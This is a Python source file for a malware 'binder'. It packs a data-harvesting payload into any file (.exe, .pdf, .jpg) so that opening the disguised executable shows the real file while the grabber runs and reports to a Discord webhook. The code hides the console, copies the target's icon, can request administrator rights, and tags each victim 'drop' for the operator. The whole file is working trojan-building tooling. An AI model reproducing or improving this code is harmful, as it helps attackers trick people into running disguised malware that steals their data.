#!/usr/bin/env python3
"""Bind the grabber into any file — .exe, .pdf, .docx, .jpg, whatever.

    python binder.py --target "C:\\path\\app.exe"
    python binder.py --target app.py                    # patches the .py instead
    python binder.py --target "photo.jpg" --out dist\\photo.jpg
    python binder.py --target app.exe --icon none       # skip icon transplant

The result is a single file. Double-click it: the real app opens and the
harvest starts from the same click. Nothing else is needed on the target.

Output defaults to "<target dir>\\<stem>_bound.exe" — always .exe, because
Windows launches by extension. A bound .pdf opens the real PDF in its normal
viewer after the grabber starts.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import shutil
import struct
import subprocess
import sys
import zlib
from pathlib import Path

import inject
import stub

ROOT = Path(__file__).resolve().parent
HARVEST = ROOT / "payload" / "harvest.py"
STUB_SRC = ROOT / "stub.py"
BUILD = ROOT / "build"
MAGIC = stub.MAGIC

DEFAULT_WEBHOOK = ("https://discord.com/api/webhooks/"
                   "FRIEND_WEBHOOK_ID/FRIEND_WEBHOOK_TOKEN")


def ensure_pyinstaller() -> None:
    """Fail with the exact command instead of a bare ModuleNotFoundError."""
    try:
        import PyInstaller  # noqa: F401
    except ModuleNotFoundError:
        raise SystemExit(
            "[!] PyInstaller is not installed for this interpreter:\n"
            f"    {sys.executable}\n"
            "    install it once:\n"
            f'    "{sys.executable}" -m pip install --upgrade pyinstaller\n'
            "    or double-click setup_deps.bat"
        )


def default_app_id(target: Path) -> str:
    """Label the harvest with the file it was actually bound into.

    A bound "Fusion Bound.exe" must report fusion-bound, not the menu sender's
    placeholder — otherwise every drop looks like the direct send.py run and
    you cannot tell which bound file called home.
    """
    stem = target.stem if target.suffix else target.name
    slug = "".join(ch if ch.isalnum() else "-" for ch in stem.lower())
    slug = "-".join(part for part in slug.split("-") if part)
    return slug or "bound"


# --------------------------------------------------------------------------
# stub build / cache
# --------------------------------------------------------------------------

def _cache_key(icon: str | None, admin: bool = False) -> str:
    h = hashlib.sha256()
    h.update(HARVEST.read_bytes())
    h.update(STUB_SRC.read_bytes())
    h.update((icon or "none").encode("utf-8", "replace"))
    h.update(b"hidden-imports-v1\0")
    h.update(",".join(harvest_imports()).encode("utf-8", "replace"))
    h.update(b"admin-v1\0" + (b"1" if admin else b"0"))
    try:
        import PyInstaller
        h.update(PyInstaller.__version__.encode())
    except ImportError:
        pass
    return h.hexdigest()[:16]


def harvest_imports() -> list[str]:
    """Modules harvest.py needs at exec time.

    harvest.py ships as an --add-data file, so PyInstaller never reads it and
    never bundles the stdlib modules it imports. Without this list the frozen
    stub dies on the first `import getpass` with a ModuleNotFoundError and the
    whole grab is silent. Parsed from source, not hand-maintained.
    """
    import ast
    tree = ast.parse(HARVEST.read_text(encoding="utf-8"), str(HARVEST))
    found: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                found.add(alias.name)
        elif isinstance(node, ast.ImportFrom):
            if node.level == 0 and node.module:
                found.add(node.module)
    names: list[str] = []
    for name in sorted(found):
        names.append(name)
        top = name.split(".")[0]
        if top != name:
            names.append(top)
    return list(dict.fromkeys(names))


def _pyinstaller(icon: str | None, out_dir: Path, admin: bool = False) -> Path:
    cmd = [sys.executable, "-m", "PyInstaller",
           "--noconfirm", "--clean", "--onefile", "--noconsole",
           "--log-level", "WARN",
           "--name", "oxstub",
           "--distpath", str(out_dir / "bin"),
           "--workpath", str(out_dir / "work"),
           "--specpath", str(out_dir / "spec"),
           "--add-data", f"{HARVEST}{os.pathsep}."]
    for module in harvest_imports():
        cmd += ["--hidden-import", module]
    if icon:
        cmd += ["--icon", icon]
    if admin:
        # --uac-admin stamps requireAdministrator into the stub manifest, so the
        # UAC prompt lands on the bound file instead of the hidden temp copy.
        cmd += ["--uac-admin"]
    cmd.append(str(STUB_SRC))
    proc = subprocess.run(cmd, cwd=str(ROOT), capture_output=True, text=True)
    exe = out_dir / "bin" / "oxstub.exe"
    if proc.returncode != 0 or not exe.is_file():
        raise SystemExit("[!] stub build failed\n" + (proc.stderr or proc.stdout)[-2000:])
    return exe


def build_stub(icon: str | None, admin: bool = False) -> Path:
    ensure_pyinstaller()
    key = _cache_key(icon, admin)
    cached = BUILD / f"stub_{key}.exe"
    if cached.is_file():
        return cached
    BUILD.mkdir(parents=True, exist_ok=True)
    out_dir = BUILD / f"build_{key}"
    try:
        exe = _pyinstaller(icon, out_dir, admin)
    except SystemExit:
        if not icon:
            raise
        print("[*] icon transplant failed, rebuilding with the default icon")
        exe = _pyinstaller(None, out_dir, admin)
    shutil.copyfile(exe, cached)
    shutil.rmtree(out_dir, ignore_errors=True)
    # Binding a .txt and binding an .exe produce different stubs (icon source),
    # so keep a small pool instead of one - otherwise alternating targets pays
    # the full ~60 s PyInstaller build every time.
    stale = sorted((p for p in BUILD.glob("stub_*.exe") if p != cached),
                   key=lambda p: p.stat().st_mtime, reverse=True)
    for old in stale[2:]:
        try:
            old.unlink()
        except OSError:
            pass
    return cached


# --------------------------------------------------------------------------
# bind
# --------------------------------------------------------------------------

def bind(target: Path, out: Path, webhook: str, app_id: str,
         icon: str | None, admin: bool = False) -> Path:
    data = target.read_bytes()
    stub_exe = build_stub(icon, admin or stub.wants_admin(data))
    packed = stub.mask(zlib.compress(data, 6))
    meta = json.dumps({"name": target.name, "size": len(data),
                       "blob": len(packed), "webhook": webhook,
                       "app_id": app_id}).encode("utf-8")
    out.parent.mkdir(parents=True, exist_ok=True)
    with out.open("wb") as fh:
        fh.write(stub_exe.read_bytes())
        fh.write(packed)
        fh.write(meta)
        fh.write(struct.pack("<I", len(meta)))
        fh.write(MAGIC)
    return out


def verify(bound: Path, target: Path) -> bool:
    """Read the bound file back the same way the stub does."""
    parsed = stub._split(bound.read_bytes())
    if parsed is None:
        print("   [!!] trailer does not parse")
        return False
    meta, data = parsed
    if data != target.read_bytes():
        print("   [!!] restored bytes do not match the original")
        return False
    if not meta["webhook"].startswith("https://"):
        print("   [!!] webhook missing from meta")
        return False
    print(f"   [OK] {target.name} -> {bound.name}  "
          f"{bound.stat().st_size:,} bytes (payload {len(data):,})")
    return True


# --------------------------------------------------------------------------
# entry
# --------------------------------------------------------------------------

def _pick_icon(target: Path, mode: str) -> str | None:
    if mode == "none":
        return None
    if mode != "auto":
        return mode
    if target.suffix.lower() != ".exe":
        return None
    return f"{target},0"


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--target", type=Path, required=True)
    p.add_argument("--out", type=Path)
    p.add_argument("--webhook", default=DEFAULT_WEBHOOK)
    p.add_argument("--app-id", default=None,
                   help="label for this drop; defaults to the target's file name")
    p.add_argument("--icon", default="auto",
                   help="auto | none | path.ico | path.exe,0")
    p.add_argument("--force", action="store_true",
                   help="bind even if the target is a .py file")
    args = p.parse_args()

    target = args.target.expanduser().resolve()
    if not target.is_file():
        raise SystemExit(f"[!] not a file: {target}")

    webhook = args.webhook.strip()
    if not webhook.startswith("https://"):
        raise SystemExit("[!] --webhook must be an https URL")

    app_id = args.app_id or default_app_id(target)

    if target.suffix.lower() == ".py" and not args.force:
        inject.patch_file(target, webhook, app_id)
        print(f"[OK] patched {target}")
        return 0

    # Always .exe: a bound .pdf or .jpg has to be double-clickable, and Windows
    # runs executables by extension, not by content. The original is dropped to
    # %TEMP% and opened with its registered handler instead.
    out = args.out or target.with_name(f"{target.stem}_bound.exe")
    out = out.expanduser().resolve()
    if out == target:
        raise SystemExit("[!] --out would overwrite the target")

    icon = _pick_icon(target, args.icon)
    admin = stub.wants_admin(target.read_bytes())
    stub_exe = build_stub(icon, admin)
    print(f"[*] stub: {stub_exe.name}"
          f"{'  (admin manifest)' if admin else ''}")
    print(f"[*] binding {target.name} ({target.stat().st_size:,} bytes) as {app_id}")
    bound = bind(target, out, webhook, app_id, icon, admin)
    if not verify(bound, target):
        return 1
    print(f"[OK] {bound}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
